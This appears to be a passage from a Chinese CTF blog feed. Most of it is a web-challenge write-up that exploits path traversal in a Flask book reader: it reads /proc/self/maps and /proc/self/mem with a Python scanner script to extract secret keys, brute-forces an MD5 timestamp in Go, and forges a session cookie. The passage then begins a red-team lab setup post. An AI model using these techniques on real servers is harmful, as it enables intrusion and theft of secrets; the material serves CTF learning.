class="string">&#x27;page&#x27;</span>):</span><br><span class="line">        page = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    words = read_file_page(filepath, page, page_size)</span><br><span class="line">    prev_page = page - <span class="number">1</span> <span class="keyword">if</span> page &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    next_page = page + <span class="number">1</span> <span class="keyword">if</span> page &lt; total_pages <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;book&#x27;</span>] = book</span><br><span class="line">    session[<span class="string">&#x27;page&#x27;</span>] = page</span><br><span class="line">    session[<span class="string">&#x27;page_size&#x27;</span>] = page_size</span><br><span class="line">    session[<span class="string">&#x27;total_pages&#x27;</span>] = total_pages</span><br><span class="line">    session[<span class="string">&#x27;prev_page&#x27;</span>] = prev_page</span><br><span class="line">    session[<span class="string">&#x27;next_page&#x27;</span>] = next_page</span><br><span class="line">    session[<span class="string">&#x27;filepath&#x27;</span>] = filepath</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:</span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_page</span>(<span class="params">filename, page_number, page_size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size+i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.seek(offset)</span><br><span class="line">                    words = file.read(size)</span><br><span class="line">                <span class="keyword">return</span> words.decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#if error again</span></span><br><span class="line">        offset = (page_number - <span class="number">1</span>) * page_size</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.seek(offset)</span><br><span class="line">            words = file.read(page_size)</span><br><span class="line">        <span class="keyword">return</span> words.split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;8000&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　发现源码执行了<code>/readflag</code>​，读一下<code>/readflag</code>​的内容，发现是elf文件</p><p>　　​<img src="/Writeup/WEB/reading/bb78a50933216a17f47a3fd91663931-20230608002453-n3mlrfn.png" alt="bb78a50933216a17f47a3fd91663931">​</p><p>　　整到本地后用ida看看，就是实现了一个很简单的读flag的操作，当然我们直接任意文件读这个文件是不够权限的<br>所以我们就是要进入到这里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:</span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>　　​<img src="/Writeup/WEB/reading/image-20230608002520-ii4g5pr.png" alt="image">​</p><p>　　​<img src="/Writeup/WEB/reading/image-20230608002732-bbs09ra.png" alt="image"></p><p>　　‍</p><h1 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h1><p>　　继续看代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_page</span>(<span class="params">filename, page_number, page_size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size+i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.seek(offset)</span><br><span class="line">                    words = file.read(size)</span><br><span class="line">                <span class="keyword">return</span> words.decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#if error again</span></span><br><span class="line">        offset = (page_number - <span class="number">1</span>) * page_size</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.seek(offset)</span><br><span class="line">            words = file.read(page_size)</span><br><span class="line">        <span class="keyword">return</span> words.split(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>　　Python File seek() 方法：<strong>seek()</strong> 方法用于移动文件读取指针到指定位置。<br>​                                        <code>fileObject.seek(offset[, whence])</code>​<strong>offset</strong> – 开始的偏移量，也就是代表需要移动偏移的字节数</p><p>　　可以看到</p><p>　　​<code>offset = (page_number - 1) * page_size+i offset</code>​变量用于确定文件读取指针的地址<br>​<code>words = file.read(size)</code>​page_size 决定读取的字节数</p><p>　　那么现在思路就是通过读<code>map</code>​确定要读取的内存的起止地址</p><p>　　然后读取<code>mem</code>​，并通过控制<code>page_number</code>​和<code>page_size</code>​来控制<code>offset</code>​，从而读取到<code>secret_key</code>​和<code>key</code>​</p><h1 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h1><p>　　为了方便本地测试，修改了一下代码（from coco师傅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, send_file </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line">datatime = <span class="built_in">str</span>(time.time_ns())</span><br><span class="line">key = hashlib.md5(datatime.encode()).hexdigest()</span><br><span class="line"><span class="comment">#print(str(time.time_ns()).encode())</span></span><br><span class="line"><span class="comment">#print(app.secret_key,key)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(key)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(datatime)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book</span>():</span><br><span class="line">    filename = (request.args.get(<span class="string">&#x27;book&#x27;</span>))</span><br><span class="line">    <span class="comment"># filename = filename.replace(&#x27;..&#x27;, &#x27;.&#x27;)</span></span><br><span class="line">    page_number = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page_number&#x27;</span>))</span><br><span class="line">    page_size =<span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> read_file_page(filename, page_number, page_size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_page</span>(<span class="params">filename, page_number, page_size</span>):</span><br><span class="line">    <span class="comment"># offset, length = int(page_number), int(page_size)    # f = open(filename, &quot;rb&quot;)</span></span><br><span class="line">    <span class="comment"># f.seek(offset)</span></span><br><span class="line">    <span class="comment"># ret_data = f.read(length)</span></span><br><span class="line">    <span class="comment"># return ret_data</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size+i   </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                        file.seek(offset)</span><br><span class="line">                        words = file.read(size)                <span class="comment"># print(words)</span></span><br><span class="line">                        <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line">                <span class="comment"># return words.decode().split(&#x27;\n&#x27;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                    <span class="comment"># print(&#x27;pass&#x27;)</span></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># if error again</span></span><br><span class="line">    <span class="comment"># print(&quot;offset&quot;,offset,size)</span></span><br><span class="line">    <span class="comment"># 187650944917504   offset= 187651853627392   page_size= 4448256     offset = (page_number - 1) * page_size</span></span><br><span class="line">    <span class="comment"># print((page_number - 1) * page_size)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(offset,page_number,page_size)  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">        file.seek(offset)</span><br><span class="line">        words = file.read(page_size)</span><br><span class="line">        <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="comment"># print(session.get(&#x27;key&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(request.args.get(<span class="string">&#x27;key&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:  </span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no no n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>　　​​​<img src="/Writeup/WEB/reading/image-20230609171037-6cjl4ac.png" alt="image">​​​</p><h2 id="内存读取-1"><a href="#内存读取-1" class="headerlink" title="内存读取"></a>内存读取</h2><p>　　本地跑起来之后直接读<code>maps</code>​</p><p>　　​<code>view-source:http://172.22.251.229:8888/book?book=../../../proc/self/maps&amp;page_number=1&amp;page_size=999999</code>​</p><p>　　根据之前做题的经验（bushi<br>python3.8 &#x2F; 3.9 中<code>secret_key</code>​都存在<code>/usr/local/lib/python3.8/lib-dynload/_asyncio.cpython-38-x86_64-linux-gnu.so</code>​下的这个位置（具体为啥我也不知道），如果无法确定位置就写个脚本全部读一遍也一样的</p><p>　　​<img src="/Writeup/WEB/reading/image-20230609181927-l7f8msv.png" alt="image">​</p><p>　　因此我选取的内存起始地址是<code>7f1ecc5d8000-7ffcd7565000</code>​（选大一点好</p><p>　　​​​​<img src="/Writeup/WEB/reading/image-20230611140617-uzjbv3p.png" alt="image">​​​​​<img src="/Writeup/WEB/reading/image-20230611140636-u4rh4bd.png" alt="image">​​​</p><p>　　copy的一个脚本，将上面我选取的读取内存起止地址放到key内</p><p>　　‍</p><p>　　整个代码逻辑就是简单的根据内存起止地址计算出要读取的内存范围</p><p>　　然后通过循环找出可以整除<strong>offset</strong>的值<code>if int(offset,16) % int(i) == 0</code>​<br>原因是<code>offset = (page_number - 1) * page_size</code>​找出的能整除的值<code>int(i)</code>​相当于式子中的 <code>page_size</code>​也就是要读取的字节数<br>而 （<code>int(offset,16)</code>​） &#x2F;&#x2F; <code>page_size</code>​得出的值就是式子<code>(page_number - 1)</code>​，因此为了计算预期的offset，我们在传参<code>page_number</code>​时需要将<br>（<code>int(offset,16)</code>​） &#x2F;&#x2F; <code>page_size</code>​ 再 +1</p><p>　　接着当找到能整除的值后，请求相应的url读<code>mem</code>​，当匹配到32位的英文数字（<code>secret_key</code>​或<code>key</code>​）时就返回结果</p><p>　　跑一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># view-source:http://172.22.251.229:8888/?page_number=1&amp;page_size=100000&amp;book=../../../proc/self/maps</span></span><br><span class="line"><span class="comment"># offset = 187651651321856</span></span><br><span class="line"><span class="comment"># aaab03125000-aaab03562000</span></span><br><span class="line">key = <span class="string">&#x27;5607dc3cf000-7ffd60a4b000&#x27;</span></span><br><span class="line">offset = key.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">size = key.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">ranges = <span class="built_in">int</span>(size,<span class="number">16</span>) - <span class="built_in">int</span>(offset,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(offset,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(size,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(ranges)</span><br><span class="line"><span class="comment"># `offset = (page_number - 1) * page_size+i`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>,ranges):</span><br><span class="line">    <span class="comment">#print(int(i), int(int(offset, 16) / int(i)))</span></span><br><span class="line">    <span class="comment">#print(int(offset,16) % int(i))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(offset,<span class="number">16</span>) % <span class="built_in">int</span>(i) == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#print(int(i),int(int(offset,16) / int(i)))</span></span><br><span class="line">        urls = <span class="string">f&#x27;http://172.22.251.229:8888/book?page_number=<span class="subst">&#123;<span class="built_in">int</span>(<span class="built_in">int</span>(offset,<span class="number">16</span>) / <span class="built_in">int</span>(i))+<span class="number">1</span>&#125;</span>&amp;page_size=<span class="subst">&#123;<span class="built_in">int</span>(i)&#125;</span>&amp;book=../../../proc/self/mem&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(urls)</span><br><span class="line">        data = requests.get(urls).content</span><br><span class="line">        rt = re.findall(<span class="string">b&quot;[a-f0-9]&#123;32&#125;&quot;</span>, data)</span><br><span class="line">        <span class="keyword">if</span> rt:</span><br><span class="line">            <span class="built_in">print</span>(rt)</span><br><span class="line">            <span class="comment"># break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　得到几个能整除的值且返回了key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.22</span><span class="number">.107</span><span class="number">.127</span>:<span class="number">8888</span>/book?page_number=<span class="number">186802689</span>&amp;page_size=<span class="number">748224</span>&amp;book=../../../proc/self/mem</span><br><span class="line">[<span class="string">b&#x27;4bbd8588edb3a1a6156e5de9f9ff80ee&#x27;</span>, <span class="string">b&#x27;24ba27cd89ed1fc8f199a1bd7abf2ab0&#x27;</span>]</span><br></pre></td></tr></table></figure><p>　　​​​<img src="/Writeup/WEB/reading/image-20230611140521-o5m0nvi.png" alt="image">​​​</p><p>　　看一下这两个32位的字符串离得很近，应该就是<code>secret_key</code>​和<code>key</code>​了</p><p>　　<img src="/Writeup/WEB/reading/image-20230611140540-hz63u1p.png" alt="image"></p><h2 id="爆破时间戳"><a href="#爆破时间戳" class="headerlink" title="爆破时间戳"></a>爆破时间戳</h2><p>　　我们知道<code>secret_key</code>​就可以伪造session了，但是看一下题目，我们session里的key需要的是md5前的时间戳，而且时间戳还是纳秒（19位）的，我们能肯定不能直接爆破时间戳，那我们就要尽可能精确时间戳高位的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = hashlib.md5(<span class="built_in">str</span>(time.time_ns()).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:  </span><br></pre></td></tr></table></figure><p>　　​<img src="/Writeup/WEB/reading/image-20230611144317-rk2gwly.png" alt="image"></p><p>　　‍</p><p>　　如图，我们通过读取<code>/proc/self/stat</code>​和<code>/proc/stat</code>​就可以确定时间戳的10位，那我们只需要爆破9位，难度骤减</p><p>　　​<img src="/Writeup/WEB/reading/image-20230611145337-rgl8ph4.png" alt="image"></p><p>　　在这个系统的、starttime是 <code>147184184</code>​，btime是 <code>1684991560</code>​</p><p>　　​<img src="/Writeup/WEB/reading/image-20230611145631-l15hsd2.png" alt="image">​​<img src="/Writeup/WEB/reading/image-20230611145817-ukqyim1.png" alt="image">​</p><p>　　根据上面的公式计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1684991560</span> + <span class="number">147184184</span> / <span class="number">100</span> = <span class="number">1686463401.84</span></span><br></pre></td></tr></table></figure><p>　　‍</p><p>　　接下来就是用脚本爆破，脚本就是很简单的循环校验md5</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(start, end <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := start; i &lt; end; i++ &#123;</span><br><span class="line">m := md5.Sum([]<span class="type">byte</span>(strconv.Itoa(i)))</span><br><span class="line"><span class="comment">// fmt.Println(i)</span></span><br><span class="line"><span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, m) == <span class="string">&quot;24ba27cd89ed1fc8f199a1bd7abf2ab0&quot;</span> &#123;</span><br><span class="line">fmt.Println(i, m)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程数量</span></span><br><span class="line">n := <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算每个线程遍历的区间</span></span><br><span class="line">step := (<span class="number">1686463401000000000</span> - <span class="number">1686463403000000000</span>) / n</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">start := <span class="number">1686463401000000000</span> + i*step</span><br><span class="line">end := start + step</span><br><span class="line"><span class="keyword">if</span> i == n<span class="number">-1</span> &#123;</span><br><span class="line">end = <span class="number">1686463403000000000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(start, end <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">test(start, end)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(start, end)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　爆破成功，时间有点久</p><p>　　​<img src="/Writeup/WEB/reading/image-20230611153928-wb0xrdp.png" alt="image">​</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1686463402599365344</span> [<span class="number">36</span> <span class="number">186</span> <span class="number">39</span> <span class="number">205</span> <span class="number">137</span> <span class="number">237</span> <span class="number">31</span> <span class="number">200</span> <span class="number">241</span> <span class="number">153</span> <span class="number">161</span> <span class="number">189</span> <span class="number">122</span> <span class="number">191</span> <span class="number">42</span> <span class="number">176</span>]</span><br></pre></td></tr></table></figure><p>　　‍</p><p>　　接下来就是使用​<code>secret_key</code>​伪造session，如：<code>&#123;&#39;key&#39;: &#39;xxxx&#39;&#125;</code>​</p><p>　　​<img src="/Writeup/WEB/reading/image-20230611154243-w6hypp9.png" alt="image">​</p><h1 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJrZXkiOiIxNjg2NDYzNDAyNTk5MzY1MzQ0In0.ZIV6ug.tuuw7OlVYlFPfUOMvdo7UxVfUSg</span><br></pre></td></tr></table></figure><p>　　​<img src="/Writeup/WEB/reading/image-20230611154236-j3sjqtk.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> 内存读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK实战系列——红队实战（一）</title>
      <link href="/WEB/ATT&amp;CK-1/"/>
      <url>/WEB/ATT&amp;CK-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-amp-CK实战系列——红队实战（一）"><a href="#ATT-amp-CK实战系列——红队实战（一）" class="headerlink" title="ATT&amp;CK实战系列——红队实战（一）"></a>ATT&amp;CK实战系列——红队实战（一）</h1><p>纯小白向文章，大佬勿喷，有错误的地方希望大佬们指正</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拓朴图如下： </p><p>（win7为VM1，win2003为VM2，win2008为VM3）</p><p><img src="/WEB/ATT&CK-1/%E7%BB%98%E5%9B%BE2.png" alt="绘图2"></p><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>因为我的kali是用wsl2搭建的，而靶机是在vmware下搭建的，所以要重新配置一下vmware的虚拟网卡<br>首先，要获取WSL2下kali的虚拟网络的IP地址和子网掩码</p><p>通过命令：<code> ifconfig</code></p><p><img src="/WEB/ATT&CK-1/image-20230420174034744.png" alt="image-20230420174034744"></p><p>可以看到kali的ip为172.22.251.229 </p><p>为了使vmware中运行的虚拟机可以和kali互通，需要在VMware虚拟网络编辑器中设置一个自定义虚拟网络，从而让kali和web服务器在同一个子网内</p><p>基本步骤：</p><ol><li>打开VMware虚拟网络编辑器。</li><li>点击“更改设置”按钮，然后在“网络适配器”选项卡上选择一个适配器，例如VMnet8。</li><li>在“子网IP”部分，选择一个未使用的IP地址，例如172.22.8.1，并确保子网掩码设置为255.255.255.0。</li><li>点击“NAT设置”按钮，在“网关IP”部分，输入172.22.8.2。</li><li>点击“确定”保存更改，并关闭VMware虚拟网络编辑器。</li></ol><p><img src="/WEB/ATT&CK-1/image-20230420174434468.png" alt="image-20230420174434468"></p><p>至此，靶机中的web服务器就可以和kali攻击机互通了，</p><p>接下来就要配置靶机的内网环境，通过在web服务器新建一个网卡来实现模拟内网环境</p><p>（如下面的丑图所示</p><p><img src="/WEB/ATT&CK-1/image-20230424112740272.png" alt="image-20230424112740272"></p><p><img src="/WEB/ATT&CK-1/image-20230421124532135.png" alt="image-20230421124532135"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 